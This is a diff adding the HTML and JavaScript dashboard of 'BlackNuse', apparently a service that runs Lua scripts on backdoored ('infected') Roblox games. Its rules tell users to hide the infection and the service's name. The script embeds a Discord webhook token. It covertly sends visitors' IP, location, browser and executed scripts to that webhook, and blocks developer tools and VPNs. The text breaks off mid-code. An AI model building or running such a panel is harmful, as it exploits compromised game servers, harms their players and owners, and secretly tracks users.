@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackNuse - 대시보드</title>
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        @font-face {
+            font-family: 'KimjungchulGothic-Bold';
+            src: url('https://cdn.jsdelivr.net/gh/projectnoonnu/noonfonts_2302_01@1.0/KimjungchulGothic-Bold.woff2') format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+
+        :root {
+            --bg-primary: #E4E9F7;
+            --bg-secondary: #ffffff;
+            --bg-sidebar: linear-gradient(180deg, #11101D 0%, #1d1b31 100%);
+            --text-primary: #11101d;
+            --text-secondary: #666;
+            --text-white: #ffffff;
+            --accent-primary: linear-gradient(135deg, #667eea, #764ba2);
+            --accent-hover: linear-gradient(135deg, #5a6fd8, #6a4190);
+            --border-color: #ddd;
+            --shadow-light: 0 2px 10px rgba(0,0,0,0.1);
+            --shadow-medium: 0 4px 20px rgba(0,0,0,0.15);
+            --shadow-heavy: 0 8px 30px rgba(0,0,0,0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "KimjungchulGothic-Bold";
+        }
+
+        .dashboard-layout {
+            background: var(--bg-primary);
+            min-height: 100vh;
+            transition: all 0.3s ease;
+        }
+
+        /* 사이드바 */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 320px;
+            background: var(--bg-sidebar);
+            padding: 25px;
+            z-index: 99;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 4px 0 20px rgba(0,0,0,0.1);
+            border-right: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar.collapsed {
+            width: 110px;
+            padding: 25px 20px;
+        }
+
+        .sidebar .logo-details {
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-bottom: 35px;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+
+        .sidebar.collapsed .logo-details {
+            justify-content: center;
+        }
+
+        .sidebar .logo-details .icon {
+            width: 55px;
+            height: 55px;
+            background: var(--accent-primary);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 26px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+            flex-shrink: 0;
+        }
+
+        .sidebar .logo-details .logo_name {
+            color: var(--text-white);
+            font-size: 24px;
+            font-weight: 600;
+            margin-left: 18px;
+            transition: all 0.5s ease;
+            white-space: nowrap;
+            opacity: 1;
+        }
+
+        .sidebar.collapsed .logo-details .logo_name {
+            opacity: 0;
+            pointer-events: none;
+            margin-left: 0;
+            width: 0;
+        }
+
+        .sidebar .nav-list {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 25px;
+        }
+
+        .sidebar li {
+            position: relative;
+            margin: 10px 0;
+            list-style: none;
+        }
+
+        .sidebar li a {
+            display: flex;
+            height: 55px;
+            width: 100%;
+            border-radius: 14px;
+            align-items: center;
+            justify-content: flex-start;
+            text-decoration: none;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            background: transparent;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            padding: 0 18px;
+        }
+
+        .sidebar.collapsed li a {
+            justify-content: center;
+            padding: 0;
+        }
+
+        .sidebar li a:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .sidebar li a.active {
+            background: var(--accent-primary);
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .sidebar li i {
+            font-size: 22px;
+            color: var(--text-white);
+            transition: all 0.3s ease;
+            min-width: 22px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .sidebar li a .links_name {
+            color: var(--text-white);
+            font-size: 17px;
+            font-weight: 500;
+            white-space: nowrap;
+            margin-left: 18px;
+            transition: all 0.5s ease;
+            opacity: 1;
+        }
+
+        .sidebar.collapsed li a .links_name {
+            opacity: 0;
+            pointer-events: none;
+            margin-left: 0;
+            width: 0;
+        }
+
+        .sidebar .profile {
+            height: 90px;
+            background: var(--accent-primary);
+            border-radius: 18px;
+            padding: 15px 20px;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.4);
+            border: 1px solid rgba(255,255,255,0.15);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            flex-shrink: 0;
+        }
+
+        .sidebar.collapsed .profile {
+            justify-content: center;
+            padding: 15px 12px;
+            height: 75px;
+        }
+
+        .sidebar .profile-details {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .sidebar.collapsed .profile-details {
+            justify-content: center;
+            gap: 0;
+        }
+
+        .sidebar .profile-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 3px solid rgba(255,255,255,0.4);
+            object-fit: cover;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            flex-shrink: 0;
+        }
+
+        .sidebar .profile-info {
+            flex: 1;
+            min-width: 0;
+            transition: all 0.5s ease;
+            overflow: hidden;
+            opacity: 1;
+        }
+
+        .sidebar.collapsed .profile-info {
+            opacity: 0;
+            pointer-events: none;
+            width: 0;
+            flex: 0;
+        }
+
+        .sidebar .profile .name {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-white);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            margin-bottom: 4px;
+        }
+
+        .sidebar .profile .job {
+            font-size: 13px;
+            color: rgba(255,255,255,0.85);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .sidebar .profile-actions {
+            display: flex;
+            gap: 8px;
+            transition: all 0.5s ease;
+            flex-shrink: 0;
+            opacity: 1;
+        }
+
+        .sidebar.collapsed .profile-actions {
+            opacity: 0;
+            pointer-events: none;
+            width: 0;
+            flex: 0;
+        }
+
+        .sidebar .profile-btn {
+            width: 32px;
+            height: 32px;
+            background: rgba(255,255,255,0.25);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+        }
+
+        .sidebar .profile-btn:hover {
+            background: rgba(255,255,255,0.35);
+            transform: scale(1.1);
+        }
+
+        /* 메인 콘텐츠 */
+        .home-section {
+            margin-left: 320px;
+            min-height: 100vh;
+            background: var(--bg-primary);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 35px;
+        }
+
+        .sidebar.collapsed ~ .home-section {
+            margin-left: 110px;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 35px;
+            padding: 25px 0;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .section-title {
+            font-size: 30px;
+            font-weight: 700;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .section-title i {
+            width: 45px;
+            height: 45px;
+            background: var(--accent-primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        /* 버튼 스타일 */
+        .action-buttons {
+            display: flex;
+            gap: 18px;
+            margin-bottom: 35px;
+            flex-wrap: wrap;
+        }
+
+        .button {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            color: white;
+            font-family: "KimjungchulGothic-Bold";
+            font-size: 15px;
+            font-weight: 600;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 130px;
+            justify-content: center;
+        }
+
+        .button-red {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+        }
+
+        .button-yellow {
+            background: linear-gradient(135deg, #ffd93d, #ff9500);
+        }
+
+        .button-green {
+            background: linear-gradient(135deg, #6bcf7f, #4caf50);
+        }
+
+        .button-blue {
+            background: linear-gradient(135deg, #4facfe, #00f2fe);
+        }
+
+        .button-purple {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+        }
+
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-medium);
+        }
+
+        /* 에디터 스타일 */
+        .editor-container {
+            background: var(--bg-secondary);
+            border-radius: 18px;
+            overflow: hidden;
+            box-shadow: var(--shadow-medium);
+            border: 1px solid var(--border-color);
+        }
+
+        #editor {
+            height: 70vh;
+            width: 100%;
+        }
+
+        /* 게임 카드 스타일 */
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 30px;
+            margin-top: 25px;
+        }
+
+        .game-card {
+            background: var(--bg-secondary);
+            border-radius: 18px;
+            overflow: hidden;
+            box-shadow: var(--shadow-light);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid var(--border-color);
+        }
+
+        .game-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-heavy);
+        }
+
+        .game-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .game-card-content {
+            padding: 25px;
+        }
+
+        .game-card-title {
+            font-size: 19px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 10px;
+        }
+
+        .game-card-description {
+            color: var(--text-secondary);
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
+        .game-card-stats {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+
+        .game-card-button {
+            width: 100%;
+            background: var(--accent-primary);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .game-card-button:hover {
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+        }
+
+        .game-status {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .status-infected {
+            background: #e8f5e8;
+            color: #2e7d32;
+        }
+
+        /* 규칙 스타일 */
+        .rules-container {
+            background: var(--bg-secondary);
+            border-radius: 18px;
+            padding: 35px;
+            box-shadow: var(--shadow-light);
+            border: 1px solid var(--border-color);
+        }
+
+        .rule-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 18px;
+            padding: 18px;
+            margin-bottom: 12px;
+            background: var(--bg-primary);
+            border-radius: 12px;
+            border-left: 4px solid var(--accent-primary);
+            transition: all 0.3s ease;
+        }
+
+        .rule-item:hover {
+            transform: translateX(5px);
+            box-shadow: var(--shadow-medium);
+        }
+
+        .rule-number {
+            width: 35px;
+            height: 35px;
+            background: var(--accent-primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 15px;
+            flex-shrink: 0;
+        }
+
+        .rule-text {
+            color: var(--text-primary);
+            line-height: 1.6;
+            font-size: 15px;
+        }
+
+        .rule-description {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+
+        /* 스크립트 실행 상태 표시 */
+        .script-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--bg-secondary);
+            border: 2px solid var(--accent-primary);
+            border-radius: 12px;
+            padding: 15px 20px;
+            box-shadow: var(--shadow-medium);
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            gap: 12px;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .script-status.active {
+            display: flex;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #4caf50;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .section {
+            display: none;
+        }
+
+        .section.active {
+            display: block;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .security-warning {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        /* 반응형 */
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 110px;
+                padding: 25px 20px;
+            }
+            
+            .sidebar .logo-details {
+                justify-content: center;
+            }
+            
+            .sidebar .logo-details .logo_name,
+            .sidebar li a .links_name,
+            .sidebar .profile-info,
+            .sidebar .profile-actions {
+                opacity: 0;
+                pointer-events: none;
+                width: 0;
+            }
+            
+            .sidebar li a {
+                justify-content: center;
+                padding: 0;
+            }
+            
+            .sidebar .profile {
+                justify-content: center;
+                padding: 15px 12px;
+            }
+            
+            .home-section {
+                margin-left: 110px;
+                padding: 25px;
+            }
+            
+            .action-buttons {
+                justify-content: center;
+            }
+            
+            .section-title {
+                font-size: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 스크립트 실행 상태 표시 -->
+    <div id="script-status" class="script-status">
+        <div class="status-indicator"></div>
+        <span>스크립트 실행 완료</span>
+    </div>
+
+    <div id="security-check" class="security-warning" style="display: none;">
+        ⚠️ VPN 또는 프록시 사용이 감지되었습니다. 접근이 제한됩니다.
+    </div>
+
+    <div class="dashboard-layout">
+        <div class="sidebar" id="sidebar">
+            <div class="logo-details" onclick="toggleSidebar()">
+                <div class="icon">
+                    <i class='bx bx-menu'></i>
+                </div>
+                <div class="logo_name">BlackNuse</div>
+            </div>
+            
+            <ul class="nav-list" id="nav-list">
+                <!-- 일반 사용자 메뉴 -->
+                <li class="user-menu">
+                    <a onclick="showSection('executor')" data-section="executor" class="active">
+                        <i class='bx bx-code-alt'></i>
+                        <span class="links_name">실행기</span>
+                    </a>
+                </li>
+                <li class="user-menu">
+                    <a onclick="showSection('rules')" data-section="rules">
+                        <i class='bx bx-shield-alt'></i>
+                        <span class="links_name">규칙</span>
+                    </a>
+                </li>
+                <li class="user-menu">
+                    <a onclick="showSection('games')" data-section="games">
+                        <i class='bx bx-game'></i>
+                        <span class="links_name">게임 목록</span>
+                    </a>
+                </li>
+                
+                <!-- 어드민 메뉴 -->
+                <li class="admin-menu" style="display: none;">
+                    <a href="admin.html">
+                        <i class='bx bx-crown'></i>
+                        <span class="links_name">어드민 패널</span>
+                    </a>
+                </li>
+                
+                <!-- 공통 메뉴 -->
+                <li>
+                    <a href="https://discord.gg/8Xv9eHrnss" target="_blank">
+                        <i class='bx bxl-discord-alt'></i>
+                        <span class="links_name">디스코드</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="index.html">
+                        <i class='bx bx-home'></i>
+                        <span class="links_name">홈으로</span>
+                    </a>
+                </li>
+            </ul>
+
+            <div class="profile">
+                <div class="profile-details">
+                    <img id="profile-avatar" class="profile-avatar" src="/placeholder.svg?height=60&width=60" alt="Profile">
+                    <div class="profile-info">
+                        <div class="name" id="profile-name">사용자</div>
+                        <div class="job" id="profile-role">Premium</div>
+                    </div>
+                    <div class="profile-actions">
+                        <button class="profile-btn" onclick="logout()" title="로그아웃">
+                            <i class='bx bx-log-out'></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <section class="home-section">
+            <!-- 실행기 섹션 -->
+            <div id="executor-section" class="section active">
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class='bx bx-code-alt'></i>
+                        스크립트 실행기
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="button button-red" onclick="executeScript()">
+                        <i class='bx bx-play'></i>
+                        Execute
+                    </button>
+                    <button class="button button-yellow" onclick="clearEditor()">
+                        <i class='bx bx-trash'></i>
+                        Clear
+                    </button>
+                    <button class="button button-blue" onclick="executeR6()">
+                        <i class='bx bx-universal-access'></i>
+                        R6
+                    </button>
+                    <button class="button button-green" onclick="executeRE()">
+                        <i class='bx bx-refresh'></i>
+                        RE
+                    </button>
+                </div>
+                
+                <div class="editor-container">
+                    <div id="editor"></div>
+                </div>
+            </div>
+
+            <!-- 규칙 섹션 -->
+            <div id="rules-section" class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class='bx bx-shield-alt'></i>
+                        이용 규칙
+                    </div>
+                </div>
+                
+                <div class="rules-container">
+                    <div class="rule-item">
+                        <div class="rule-number">1</div>
+                        <div>
+                            <div class="rule-text">감염된 게임 유출 금지</div>
+                            <div class="rule-description">
+                                서버사이드로 감염된 게임의 정보를 외부에 유출하거나 공유하는 행위를 금지합니다. 
+                                이는 서비스의 보안과 지속성을 위한 필수 규칙입니다.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="rule-item">
+                        <div class="rule-number">2</div>
+                        <div>
+                            <div class="rule-text">맵을 심각하게 파괴할 수 있는 스크립트 실행 금지</div>
+                            <div class="rule-description">
+                                게임의 맵이나 구조물을 완전히 파괴하여 다른 플레이어의 게임 경험을 심각하게 해치는 스크립트 사용을 금지합니다.
+                                적당한 수준의 장난은 허용되지만, 과도한 파괴는 제재 대상입니다.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="rule-item">
+                        <div class="rule-number">3</div>
+                        <div>
+                            <div class="rule-text">서버사이드 감염 사실 언급 금지</div>
+                            <div class="rule-description">
+                                게임 내에서 서버사이드가 감염되었다는 사실을 언급하거나 알리는 행위를 금지합니다. 
+                                이는 서비스 노출을 방지하기 위한 중요한 규칙입니다.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="rule-item">
+                        <div class="rule-number">4</div>
+                        <div>
+                            <div class="rule-text">서버사이드 이름 언급 금지</div>
+                            <div class="rule-description">
+                                게임 내에서 "BlackNuse" 또는 기타 서버사이드 관련 이름을 언급하는 것을 금지합니다. 
+                                익명성 유지가 서비스 지속의 핵심입니다.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="rule-item">
+                        <div class="rule-number">5</div>
+                        <div>
+                            <div class="rule-text">허위 신고 금지, all 금지, 무적 스크립트 금지</div>
+                            <div class="rule-description">
+                                다른 플레이어에 대한 허위 신고, 모든 플레이어를 대상으로 하는 스크립트(all), 
+                                무적 상태를 만드는 스크립트 사용을 금지합니다. 공정한 게임 환경 유지가 목적입니다.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 게임 목록 섹션 -->
+            <div id="games-section" class="section">
+                <div class="section-header">
+                    <div class="section-title">
+                        <i class='bx bx-game'></i>
+                        감염 게임 목록
+                    </div>
+                </div>
+                
+                <div class="games-grid">
+                    <div class="game-card">
+                        <img src="/placeholder.svg?height=200&width=340" alt="테스트1">
+                        <div class="game-card-content">
+                            <div class="game-status status-infected">🟢 감염됨</div>
+                            <div class="game-card-title">테스트1</div>
+                            <div class="game-card-description">BlackNuse 테스트용 게임 1번입니다. 서버사이드 스크립트 실행 가능</div>
+                            <div class="game-card-stats">
+                                <i class='bx bx-user'></i>
+                                <span>1,000 플레이어</span>
+                                <i class='bx bx-star'></i>
+                                <span>5.0/5</span>
+                            </div>
+                            <button class="game-card-button" onclick="joinGame('test1')">
+                                <i class='bx bx-external-link'></i>
+                                게임 접속
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="game-card">
+                        <img src="/placeholder.svg?height=200&width=340" alt="테스트2">
+                        <div class="game-card-content">
+                            <div class="game-status status-infected">🟢 감염됨</div>
+                            <div class="game-card-title">테스트2</div>
+                            <div class="game-card-description">BlackNuse 테스트용 게임 2번입니다. 서버사이드 스크립트 실행 가능</div>
+                            <div class="game-card-stats">
+                                <i class='bx bx-user'></i>
+                                <span>2,000 플레이어</span>
+                                <i class='bx bx-star'></i>
+                                <span>5.0/5</span>
+                            </div>
+                            <button class="game-card-button" onclick="joinGame('test2')">
+                                <i class='bx bx-external-link'></i>
+                                게임 접속
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script src="https://unpkg.com/monaco-editor@latest/min/vs/loader.js"></script>
+    <script>
+        let editor;
+        let currentUser = null;
+
+        // Discord 웹훅 URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1376400964659187884/BWaxgoW-vmm0Y2qULxaEvueX4worat8Q4DlWVOiNyBa-hwDaiMgcYGq-eT8VBr-lMakX';
+
+        // 강화된 보안 기능 - F12 및 개발자 도구 차단
+        let devToolsOpen = false;
+        let devToolsCheckInterval;
+
+        // 개발자 도구 감지 함수
+        function detectDevTools() {
+            const threshold = 160;
+            
+            if (window.outerHeight - window.innerHeight > threshold || 
+                window.outerWidth - window.innerWidth > threshold) {
+                if (!devToolsOpen) {
+                    devToolsOpen = true;
+                    handleDevToolsOpen();
+                }
+            } else {
+                devToolsOpen = false;
+            }
+        }
+
+        // 개발자 도구 열림 감지 시 처리
+        async function handleDevToolsOpen() {
+            // 화면을 검은색으로 만들기
+            document.body.style.background = '#000';
+            document.body.innerHTML = '<div style="color: white; text-align: center; padding-top: 50vh; font-size: 24px;">⚠️ 개발자 도구 사용이 감지되었습니다.</div>';
+            
+            // Discord 웹훅으로 알림 전송
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+
+                const embed = {
+                    title: '🚨 개발자 도구 사용 감지',
+                    color: 0xff0000,
+                    fields: [
+                        {
+                            name: '👤 사용자',
+                            value: currentUser ? currentUser.username : '알 수 없음',
+                            inline: true
+                        },
+                        {
+                            name: '📍 IP 주소',
+                            value: userIP,
+                            inline: true
+                        },
+                        {
+                            name: '🌍 위치',
+                            value: `${locationData.city || '알 수 없음'}, ${locationData.country_name || '알 수 없음'}`,
+                            inline: true
+                        },
+                        {
+                            name: '🕒 감지 시간',
+                            value: new Date().toLocaleString('ko-KR'),
+                            inline: false
+                        },
+                        {
+                            name: '🌐 브라우저',
+                            value: navigator.userAgent,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: 'BlackNuse Security Alert'
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+            } catch (error) {
+                console.error('웹훅 전송 실패:', error);
+            }
+
+            // 3초 후 페이지 닫기
+            setTimeout(() => {
+                window.close();
+                window.location.href = 'about:blank';
+            }, 3000);
+        }
+
+        // 키보드 이벤트 차단
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+                handleDevToolsOpen();
+                return false;
+            }
+        });
+
+        // 우클릭 차단
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            handleDevToolsOpen();
+        });
+
+        // 개발자 도구 감지 시작
+        devToolsCheckInterval = setInterval(detectDevTools, 500);
+
+        // VPN 감지 및 차단
+        async function detectVPN() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const vpnResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const vpnData = await vpnResponse.json();
+
+                if (vpnData.org && (
+                    vpnData.org.toLowerCase().includes('vpn') ||
+                    vpnData.org.toLowerCase().includes('proxy') ||
+                    vpnData.org.toLowerCase().includes('hosting') ||
+                    vpnData.org.toLowerCase().includes('datacenter')
+                )) {
+                    document.getElementById('security-check').style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = 'about:blank';
+                    }, 3000);
+                    return false;
+                }
+
+                return true;
+            } catch (error) {
+                console.error('VPN 감지 실패:', error);
+                return true;
+            }
+        }
+
+        // 웹훅 전송
+        async function sendExecutionWebhook(action, scriptContent = '') {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+
+                const currentTime = new Date().toLocaleString('ko-KR', {
+                    timeZone: 'Asia/Seoul',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                const embed = {
+                    title: '⚡ 스크립트 실행 감지',
+                    color: 0xff6b6b,
+                    fields: [
+                        {
+                            name: '👤 사용자',
+                            value: currentUser ? currentUser.username : '알 수 없음',
+                            inline: true
+                        },
+                        {
+                            name: '🎯 실행 유형',
+                            value: action,
+                            inline: true
+                        },
+                        {
+                            name: '📍 IP 주소',
+                            value: userIP,
+                            inline: true
+                        },
+                        {
+                            name: '🌍 위치',
+                            value: `${locationData.city || '알 수 없음'}, ${locationData.country_name || '알 수 없음'}`,
+                            inline: true
+                        },
+                        {
+                            name: '🕒 실행 시간',
+                            value: currentTime,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: 'BlackNuse Execution Monitor'
+                    },
+                    timestamp: new Date().toISOString()
+                };
+
+                if (scriptContent && scriptContent.length > 0 && scriptContent.length < 500) {
+                    embed.fields.push({
+                        name: '📝 스크립트 내용',
+                        value: `\`\`\`lua\n${scriptContent.substring(0, 400)}${scriptContent.length > 400 ? '...' : ''}\n\`\`\``,
+                        inline: false
+                    });
+                }
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+            } catch (error) {
+                console.error('웹훅 전송 실패:', error);
+            }
+        }
+
+        // 서버 시뮬레이션
+        function saveToServer(key, data) {
+            localStorage.setItem(`blacknuse-server-${key}`, JSON.stringify(data));
+        }
+
+        function loadFromServer(key) {
+            const data = localStorage.getItem(`blacknuse-server-${key}`);
+            return data ? JSON.parse(data) : null;
+        }
+
+        function getCurrentUser() {
+            const user = localStorage.getItem('blacknuse-current-user');
+            return user ? JSON.parse(user) : null;
+        }
+
+        function getUsers() {
+            return loadFromServer('users') || [];
+        }
+
+        function saveUsers(users) {
+            saveToServer('users', users);
+        }
+
+        // 사용자 인터페이스 업데이트
+        function updateUserInterface() {
+            if (!currentUser) return;
+            
+            document.getElementById('profile-name').textContent = currentUser.username;
+            document.getElementById('profile-role').textContent = currentUser.role === 'admin' ? 'Administrator' : 'Premium';
+            
+            const isAdmin = currentUser.username === 'excI' && currentUser.role === 'admin';
+            
+            const adminMenus = document.querySelectorAll('.admin-menu');
+            adminMenus.forEach(menu => {
+                menu.style.display = isAdmin ? 'block' : 'none';
+            });
+        }
+
+        // 사이드바 토글
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('collapsed');
+        }
+
+        // Monaco Editor 초기화
+        function initializeEditor() {
+            require.config({ paths: { 'vs': 'https://unpkg.com/monaco-editor@latest/min/vs' } });
+            require(['vs/editor/editor.main'], function () {
+                try {
+                    monaco.languages.register({ id: 'lua' });
+                    
+                    const luaKeywords = [
+                        'and', 'break', 'do', 'else', 'elseif', 'end', 'false', 'for',
+                        'function', 'if', 'in', 'local', 'nil', 'not', 'or', 'repeat',
+                        'return', 'then', 'true', 'until', 'while'
+                    ];
+                    
+                    const robloxAPI = [
+                        'game', 'workspace', 'script', 'wait', 'spawn', 'delay', 'tick',
+                        'Instance', 'Vector3', 'CFrame', 'Color3', 'UDim2', 'BrickColor',
+                        'Players', 'RunService', 'UserInputService', 'TweenService',
+                        'ReplicatedStorage', 'ServerStorage', 'StarterGui', 'StarterPack',
+                        'Lighting', 'SoundService', 'PathfindingService', 'HttpService'
+                    ];
+                    
+                    monaco.languages.registerCompletionItemProvider('lua', {
+                        provideCompletionItems: function(model, position) {
+                            const suggestions = [];
+                            
+                            luaKeywords.forEach(keyword => {
+                                suggestions.push({
+                                    label: keyword,
+                                    kind: monaco.languages.CompletionItemKind.Keyword,
+                                    insertText: keyword,
+                                    detail: 'Lua keyword'
+                                });
+                            });
+                            
+                            robloxAPI.forEach(api => {
+                                suggestions.push({
+                                    label: api,
+                                    kind: monaco.languages.CompletionItemKind.Class,
+                                    insertText: api,
+                                    detail: 'Roblox API'
+                                });
+                            });
+                            
+                            return { suggestions: suggestions };
+                        }
+                    });
+                    
+                    editor = monaco.editor.create(document.getElementById('editor'), {
+                        value: `-- BlackNuse Script Executor
+print("Hello, BlackNuse!")
+
+-- 예시 스크립트
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
+
+-- 자동완성을 위해 Ctrl+Space를 누르세요`,
+                        language: 'lua',
+                        theme: 'vs-dark',
+                        automaticLayout: true,
+                        fontSize: 14,
+                        lineNumbers: 'on',
+                        roundedSelection: false,
+                        scrollBeyondLastLine: false,
+                        minimap: { enabled: true },
+                        suggestOnTriggerCharacters: true,
+                        quickSuggestions: {
+                            other: true,
